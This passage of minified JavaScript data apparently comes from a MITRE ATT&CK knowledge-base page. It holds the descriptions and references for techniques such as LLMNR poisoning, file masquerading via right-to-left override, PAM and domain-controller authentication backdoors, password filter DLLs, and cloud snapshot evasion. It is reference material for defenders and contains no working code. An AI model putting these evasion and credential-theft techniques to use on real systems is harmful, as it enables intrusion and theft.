href='https:\u002F\u002Fbyt3bl33d3r.github.io\u002Fpractical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.secureideas.com\u002F2018\u002F04\u002Fever-run-a-relay-why-smb-relays-should-be-on-your-mind.html'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0174'\u003EResponder\u003C\u002Fa\u003E. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fnomex\u002Fnbnspoof'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.rapid7.com\u002Fdb\u002Fmodules\u002Fauxiliary\u002Fspoof\u002Fllmnr\u002Fllmnr_response'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002FSpiderLabs\u002FResponder'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";wU.external_references=[{source_name:b,external_id:wV,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1557\u002F001"},{url:"https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FLink-Local_Multicast_Name_Resolution",description:"Wikipedia. (2016, July 7). Link-Local Multicast Name Resolution. Retrieved November 17, 2017.",source_name:"Wikipedia LLMNR"},{url:"https:\u002F\u002Ftechnet.microsoft.com\u002Flibrary\u002Fcc958811.aspx",description:"Microsoft. (n.d.). NetBIOS Name Resolution. Retrieved November 17, 2017.",source_name:"TechNet NetBIOS"},{source_name:"byt3bl33d3r NTLM Relaying",url:"https:\u002F\u002Fbyt3bl33d3r.github.io\u002Fpractical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html",description:"Salvati, M. (2017, June 2). Practical guide to NTLM Relaying in 2017 (A.K.A getting a foothold in under 5 minutes). Retrieved February 7, 2019."},{source_name:"Secure Ideas SMB Relay",url:"https:\u002F\u002Fblog.secureideas.com\u002F2018\u002F04\u002Fever-run-a-relay-why-smb-relays-should-be-on-your-mind.html",description:"Kuehn, E. (2018, April 11). Ever Run a Relay? Why SMB Relays Should Be On Your Mind. Retrieved February 7, 2019."},{url:"https:\u002F\u002Fgithub.com\u002Fnomex\u002Fnbnspoof",description:"Nomex. (2014, February 7). NBNSpoof. Retrieved November 17, 2017.",source_name:"GitHub NBNSpoof"},{url:"https:\u002F\u002Fwww.rapid7.com\u002Fdb\u002Fmodules\u002Fauxiliary\u002Fspoof\u002Fllmnr\u002Fllmnr_response",description:"Francois, R. (n.d.). LLMNR Spoofer. Retrieved November 17, 2017.",source_name:"Rapid7 LLMNR Spoofer"},{url:"https:\u002F\u002Fgithub.com\u002FSpiderLabs\u002FResponder",description:"Gaffie, L. (2016, August 25). Responder. Retrieved November 17, 2017.",source_name:"GitHub Responder"},{url:"https:\u002F\u002Fwww.sternsecurity.com\u002Fblog\u002Flocal-network-attacks-llmnr-and-nbt-ns-poisoning",description:"Sternstein, J. (2013, November). Local Network Attacks: LLMNR and NBT-NS Poisoning. Retrieved November 17, 2017.",source_name:"Sternsecurity LLMNR-NBTNS"},{url:"https:\u002F\u002Fgithub.com\u002FKevin-Robertson\u002FConveigh",description:"Robertson, K. (2016, August 28). Conveigh. Retrieved November 17, 2017.",source_name:"GitHub Conveigh"}];wU["subtechnique-of"]=da;w$.id=xa;w$["object-type"]=a;w$.name="Invalid Code Signature";w$.description="Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fthreatexpress.com\u002Fblogs\u002F2017\u002Fmetatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nUnlike \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1553\u002F002'\u003ECode Signing\u003C\u002Fa\u003E, this activity will not result in a valid signature.";w$.external_references=[{source_name:b,external_id:xa,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1036\u002F001"},{source_name:"Threatexpress MetaTwin 2017",url:"https:\u002F\u002Fthreatexpress.com\u002Fblogs\u002F2017\u002Fmetatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries\u002F",description:"Vest, J. (2017, October 9). Borrowing Microsoft MetaData and Signatures to Hide Binary Payloads. Retrieved September 10, 2019."}];w$["subtechnique-of"]=aa;xb.id=xc;xb["object-type"]=a;xb.name="Masquerade Task or Service";xb.description="Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks\u002Fservices executed by the Task Scheduler or systemd will typically be given a name and\u002For description.\u003Csup\u003E\u003Ca href='https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Flibrary\u002Fbb490996.aspx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.freedesktop.org\u002Fsoftware\u002Fsystemd\u002Fman\u002Fsystemd.service.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fresearchcenter.paloaltonetworks.com\u002F2016\u002F11\u002Funit42-shamoon-2-return-disttrack-wiper\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fvms.drweb.com\u002Fvirus\u002F?i=4276269'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";xb.external_references=[{source_name:b,external_id:xc,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1036\u002F004"},{url:"https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Flibrary\u002Fbb490996.aspx",description:"Microsoft. (n.d.). Schtasks. Retrieved April 28, 2016.",source_name:"TechNet Schtasks"},{source_name:"Systemd Service Units",url:"https:\u002F\u002Fwww.freedesktop.org\u002Fsoftware\u002Fsystemd\u002Fman\u002Fsystemd.service.html",description:"Freedesktop.org. (n.d.). systemd.service — Service unit configuration. Retrieved March 16, 2020."},{url:eP,description:eQ,source_name:eR},{url:"https:\u002F\u002Fvms.drweb.com\u002Fvirus\u002F?i=4276269",description:"Doctor Web. (2014, November 21). Linux.BackDoor.Fysbis.1. Retrieved December 7, 2017.",source_name:"Fysbis Dr Web Analysis"}];xb["subtechnique-of"]=aa;xd.id=xe;xd["object-type"]=a;xd.name="Match Legitimate Name or Location";xd.description="Adversaries may match or approximate the name or location of legitimate files or resources when naming\u002Fplacing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs\u002Fimages or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.";xd.external_references=[{source_name:b,external_id:xe,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1036\u002F005"},{external_id:wW,source_name:c,url:wX},{source_name:fP,description:fQ,url:fR},{source_name:fS,url:fT,description:fU},{source_name:"Docker Images",url:"https:\u002F\u002Fdocs.docker.com\u002Fengine\u002Freference\u002Fcommandline\u002Fimages\u002F",description:"Docker. (n.d.). Docker Images. Retrieved April 6, 2021."}];xd["subtechnique-of"]=aa;xf.id=xg;xf["object-type"]=a;xf.name="Rename System Utilities";xf.description="Adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing. \u003Csup\u003E\u003Ca href='https:\u002F\u002Flolbas-project.github.io\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename \u003Ccode\u003Erundll32.exe\u003C\u002Fcode\u003E). \u003Csup\u003E\u003Ca href='http:\u002F\u002Fpages.endgame.com\u002Frs\u002F627-YBU-612\u002Fimages\u002FEndgameJournal_The%20Masquerade%20Ball_Pages_R2.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog-assets.f-secure.com\u002Fwp-content\u002Fuploads\u002F2019\u002F10\u002F15163418\u002FCozyDuke.pdf'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";xf.external_references=[{source_name:b,external_id:xg,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1036\u002F003"},{source_name:wY,url:wZ,description:w_},{source_name:fP,description:fQ,url:fR},{source_name:"F-Secure CozyDuke",description:"F-Secure Labs. (2015, April 22). CozyDuke: Malware Analysis. Retrieved December 10, 2015.",url:"https:\u002F\u002Fblog-assets.f-secure.com\u002Fwp-content\u002Fuploads\u002F2019\u002F10\u002F15163418\u002FCozyDuke.pdf"},{source_name:fS,url:fT,description:fU}];xf["subtechnique-of"]=aa;xh.id=xi;xh["object-type"]=a;xh.name="Right-to-Left Override";xh.description="Adversaries may use the right-to-left override (RTLO or RLO) character (U+202E) as a means of tricking a user into executing what they think is a benign file type but is actually executable code. RTLO is a non-printing character that causes the text that follows it to be displayed in reverse.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fresources.infosecinstitute.com\u002Fspoof-using-right-to-left-override-rtlo-technique-2\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E For example, a Windows screensaver executable named \u003Ccode\u003EMarch 25 \\u202Excod.scr\u003C\u002Fcode\u003E will display as \u003Ccode\u003EMarch 25 rcs.docx\u003C\u002Fcode\u003E. A JavaScript file named \u003Ccode\u003Ephoto_high_re\\u202Egnp.js\u003C\u002Fcode\u003E will be displayed as \u003Ccode\u003Ephoto_high_resj.png\u003C\u002Fcode\u003E.\n\nA common use of this technique is with \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566\u002F001'\u003ESpearphishing Attachment\u003C\u002Fa\u003E\u002F\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1204\u002F002'\u003EMalicious File\u003C\u002Fa\u003E since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.trendmicro.com\u002Ftrendlabs-security-intelligence\u002Fplead-targeted-attacks-against-taiwanese-government-agencies-2\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsecurelist.com\u002Fzero-day-vulnerability-in-telegram\u002F83800\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.";xh.external_references=[{source_name:b,external_id:xi,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1036\u002F002"},{source_name:"Infosecinstitute RTLO Technique",url:"https:\u002F\u002Fresources.infosecinstitute.com\u002Fspoof-using-right-to-left-override-rtlo-technique-2\u002F",description:"Security Ninja. (2015, April 16). Spoof Using Right to Left Override (RTLO) Technique. Retrieved April 22, 2019."},{source_name:"Trend Micro PLEAD RTLO",url:"https:\u002F\u002Fblog.trendmicro.com\u002Ftrendlabs-security-intelligence\u002Fplead-targeted-attacks-against-taiwanese-government-agencies-2\u002F",description:"Alintanahin, K.. (2014, May 23). PLEAD Targeted Attacks Against Taiwanese Government Agencies. Retrieved April 22, 2019."},{source_name:"Kaspersky RTLO Cyber Crime",url:"https:\u002F\u002Fsecurelist.com\u002Fzero-day-vulnerability-in-telegram\u002F83800\u002F",description:"Firsh, A.. (2018, February 13). Zero-day vulnerability in Telegram - Cybercriminals exploited Telegram flaw to launch multipurpose attacks. Retrieved April 22, 2019."}];xh["subtechnique-of"]=aa;xj.id=xk;xj["object-type"]=a;xj.name="Space after Filename";xj.description="Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.\n\nFor example, if there is a Mach-O executable file called \u003Ccode\u003Eevil.bin\u003C\u002Fcode\u003E, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to \u003Ccode\u003Eevil.txt\u003C\u002Fcode\u003E, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to \u003Ccode\u003Eevil.txt \u003C\u002Fcode\u003E (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed \u003Csup\u003E\u003Ca href='https:\u002F\u002Farstechnica.com\u002Fsecurity\u002F2016\u002F07\u002Fafter-hiatus-in-the-wild-mac-backdoors-are-suddenly-back\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E.\n\nAdversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.";xj.external_references=[{source_name:b,external_id:xk,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1036\u002F006"},{external_id:"CAPEC-649",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F649.html"},{url:"https:\u002F\u002Farstechnica.com\u002Fsecurity\u002F2016\u002F07\u002Fafter-hiatus-in-the-wild-mac-backdoors-are-suddenly-back\u002F",description:"Dan Goodin. (2016, July 6). After hiatus, in-the-wild Mac backdoors are suddenly back. Retrieved July 8, 2017.",source_name:"Mac Backdoors are back"}];xj["subtechnique-of"]=aa;xr.id=xs;xr["object-type"]=a;xr.name="Domain Controller Authentication";xr.description="Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts. \n\nMalware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user’s account and\u002For credentials (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0007'\u003ESkeleton Key\u003C\u002Fa\u003E). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and\u002For resources within single-factor authentication environments.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.secureworks.com\u002Fresearch\u002Fskeleton-key-malware-analysis'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";xr.external_references=[{source_name:b,external_id:xs,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1556\u002F001"},{source_name:xo,description:xp,url:xq},{url:bK,description:bL,source_name:bM}];xr["subtechnique-of"]=aY;xt.id=xu;xt["object-type"]=a;xt.name="Network Device Authentication";xt.description="Adversaries may use \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1601\u002F001'\u003EPatch System Image\u003C\u002Fa\u003E to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.\n\n\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1601'\u003EModify System Image\u003C\u002Fa\u003E may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2015\u002F09\u002Fsynful_knock_-_acis.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";xt.external_references=[{source_name:b,external_id:xu,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1556\u002F004"},{source_name:xv,url:xw,description:xx},{source_name:db,url:dc,description:dd},{source_name:de,url:df,description:dg}];xt["subtechnique-of"]=aY;xy.id=xz;xy["object-type"]=a;xy.name="Password Filter DLL";xy.description="Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. \n\nWindows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and\u002For domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. \n\nAdversaries can register malicious password filters to harvest credentials from local computers and\u002For entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fcarnal0wnage.attackresearch.com\u002F2013\u002F09\u002Fstealing-passwords-every-time-they.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";xy.external_references=[{source_name:b,external_id:xz,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1556\u002F002"},{url:"http:\u002F\u002Fcarnal0wnage.attackresearch.com\u002F2013\u002F09\u002Fstealing-passwords-every-time-they.html",description:"Fuller, R. (2013, September 11). Stealing passwords every time they change. Retrieved November 21, 2017.",source_name:"Carnal Ownage Password Filters Sept 2013"},{url:xl,description:xm,source_name:xn}];xy["subtechnique-of"]=aY;xA.id=xB;xA["object-type"]=a;xA.name="Pluggable Authentication Modules";xA.description="Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is \u003Ccode\u003Epam_unix.so\u003C\u002Fcode\u003E, which retrieves, sets, and verifies account authentication information in \u003Ccode\u003E\u002Fetc\u002Fpasswd\u003C\u002Fcode\u003E and \u003Ccode\u003E\u002Fetc\u002Fshadow\u003C\u002Fcode\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fopensource.apple.com\u002Fsource\u002Fdovecot\u002Fdovecot-239\u002Fdovecot\u002Fdoc\u002Fwiki\u002FPasswordDatabase.PAM.txt'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Flinux.die.net\u002Fman\u002F8\u002Fpam_unix'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Faccess.redhat.com\u002Fdocumentation\u002Fen-us\u002Fred_hat_enterprise_linux\u002F6\u002Fhtml\u002Fmanaging_smart_cards\u002Fpluggable_authentication_modules'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as \u003Ccode\u003Epam_unix.so\u003C\u002Fcode\u003E, can be patched to accept arbitrary adversary supplied values as legitimate credentials.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fzephrax\u002Flinux-pam-backdoor'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fx-c3ll.github.io\u002Fposts\u002FPAM-backdoor-DNS\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fopensource.apple.com\u002Fsource\u002Fdovecot\u002Fdovecot-239\u002Fdovecot\u002Fdoc\u002Fwiki\u002FPasswordDatabase.PAM.txt'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";xA.external_references=[{source_name:b,external_id:xB,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1556\u002F003"},{source_name:"Apple PAM",url:"https:\u002F\u002Fopensource.apple.com\u002Fsource\u002Fdovecot\u002Fdovecot-239\u002Fdovecot\u002Fdoc\u002Fwiki\u002FPasswordDatabase.PAM.txt",description:"Apple. (2011, May 11). PAM - Pluggable Authentication Modules. Retrieved June 25, 2020."},{source_name:"Man Pam_Unix",url:"https:\u002F\u002Flinux.die.net\u002Fman\u002F8\u002Fpam_unix",description:"die.net. (n.d.). pam_unix(8) - Linux man page. Retrieved June 25, 2020."},{source_name:"Red Hat PAM",url:"https:\u002F\u002Faccess.redhat.com\u002Fdocumentation\u002Fen-us\u002Fred_hat_enterprise_linux\u002F6\u002Fhtml\u002Fmanaging_smart_cards\u002Fpluggable_authentication_modules",description:"Red Hat. (n.d.). CHAPTER 2. USING PLUGGABLE AUTHENTICATION MODULES (PAM). Retrieved June 25, 2020."},{source_name:"PAM Backdoor",url:"https:\u002F\u002Fgithub.com\u002Fzephrax\u002Flinux-pam-backdoor",description:"zephrax. (2018, August 3). linux-pam-backdoor. Retrieved June 25, 2020."},{source_name:"PAM Creds",url:"https:\u002F\u002Fx-c3ll.github.io\u002Fposts\u002FPAM-backdoor-DNS\u002F",description:"Fernández, J. M. (2018, June 27). Exfiltrating credentials via PAM backdoors & DNS requests. Retrieved June 26, 2020."}];xA["subtechnique-of"]=aY;xC.id=xD;xC["object-type"]=a;xC.name="Create Cloud Instance";xC.description="An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1578\u002F001'\u003ECreate Snapshot\u003C\u002Fa\u003E of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1005'\u003EData from Local System\u003C\u002Fa\u003E or for \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1074\u002F002'\u003ERemote Data Staging\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcontent.fireeye.com\u002Fm-trends\u002Frpt-m-trends-2020'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nCreating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.";xC.external_references=[{source_name:b,external_id:xD,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1578\u002F002"},{source_name:am,url:an,description:ao},{source_name:xE,url:xF,description:xG},{source_name:xH,url:xI,description:xJ},{source_name:fV,url:fW,description:fX}];xC["subtechnique-of"]=aZ;xK.id=xL;xK["object-type"]=a;xK.name="Create Snapshot";xK.description="An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1578\u002F004'\u003ERevert Cloud Instance\u003C\u002Fa\u003E where an adversary may revert to a snapshot to evade detection and remove evidence of their presence.\n\nAn adversary may \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1578\u002F002'\u003ECreate Cloud Instance\u003C\u002Fa\u003E, mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcontent.fireeye.com\u002Fm-trends\u002Frpt-m-trends-2020'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";xK.external_references=[{source_name:b,external_id:xL,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1578\u002F001"},{source_name:am,url:an,description:ao},{source_name:"AWS Cloud Trail Backup API",url:"https:\u002F\u002Fdocs.aws.amazon.com\u002Faws-backup\u002Flatest\u002Fdevguide\u002Flogging-using-cloudtrail.html",description:"Amazon. (2020). Logging AWS Backup API Calls with AWS CloudTrail. Retrieved April 27, 2020."},{source_name:"Azure - Monitor Logs",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fazure\u002Fbackup\u002Fbackup-azure-monitoring-use-azuremonitor",description:"Microsoft. (2019, June 4). Monitor at scale by using Azure Monitor. Retrieved May 1, 2020."},{source_name:fV,url:fW,description:fX},{source_name:"GCP - Creating and Starting a VM",url:"https:\u002F\u002Fcloud.google.com\u002Fcompute\u002Fdocs\u002Finstances\u002Fcreate-start-instance#api_2",description:"Google. (2020, April 23). Creating and Starting a VM instance. Retrieved May 1, 2020."}];xK["subtechnique-of"]=aZ;xM.id=xN;xM["object-type"]=a;xM.name="Delete Cloud Instance";xM.description="An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence.  Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.\n\nAn adversary may also \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1578\u002F002'\u003ECreate Cloud Instance\u003C\u002Fa\u003E and later terminate the instance after achieving their objectives.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcontent.fireeye.com\u002Fm-trends\u002Frpt-m-trends-2020'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";xM.external_references=[{source_name:b,external_id:xN,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1578\u002F003"},{source_name:am,url:an,description:ao},{source_name:xE,url:xF,description:xG},{source_name:xH,url:xI,description:xJ},{source_name:fV,url:fW,description:fX}];xM["subtechnique-of"]=aZ;xO.id=xP;xO["object-type"]=a;xO.name="Revert Cloud Instance";xO.description="An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.\n\nAnother variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and\u002For ephemeral, with the ephemeral types often reset upon stop\u002Frestart of the VM.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.techrepublic.com\u002Fblog\u002Fthe-enterprise-cloud\u002Fbacking-up-and-restoring-snapshots-on-amazon-ec2-machines\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcloud.google.com\u002Fcompute\u002Fdocs\u002Fdisks\u002Frestore-and-delete-snapshots'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";xO.external_references=[{source_name:b,external_id:xP,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1578\u002F004"},{source_name:"Tech Republic - Restore AWS Snapshots",url:"https:\u002F\u002Fwww.techrepublic.com\u002Fblog\u002Fthe-enterprise-cloud\u002Fbacking-up-and-restoring-snapshots-on-amazon-ec2-machines\u002F",description:"Hardiman, N.. (2012, March 20). Backing up and restoring snapshots on Amazon EC2 machines. Retrieved October 8, 2019."},{source_name:"Google - Restore Cloud Snapshot",url:"https:\u002F\u002Fcloud.google.com\u002Fcompute\u002Fdocs\u002Fdisks\u002Frestore-and-delete-snapshots",description:"Google. (2019, October 7). Restoring and deleting persistent disk snapshots. Retrieved October 8, 2019."}];xO["subtechnique-of"]=aZ;xR.id=xS;xR["object-type"]=a;xR.name="Downgrade System Image";xR.description="Adversaries may install an older version of the operating system of a network device to weaken security.  Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer\u002Fless updated defensive features. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblogs.cisco.com\u002Fsecurity\u002Fevolution-of-attacks-on-cisco-ios-devices'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nOn embedded devices, downgrading the version typically only requires replacing the operating system file in storage.  With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart.  The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts.\n\nDowngrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1600'\u003EWeaken Encryption\u003C\u002Fa\u003E.  Downgrading of a system image can be done on its own, or it can be used in conjunction with \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1601\u002F001'\u003EPatch System Image\u003C\u002Fa\u003E.  ";xR.external_references=[{source_name:b,external_id:xS,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1601\u002F002"},{source_name:ap,url:aq,description:ar}];xR["subtechnique-of"]=dh;xT.id=xU;xT["object-type"]=a;xT.name="Patch System Image";xT.description="Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.\u003Csup\u003E\u003Ca 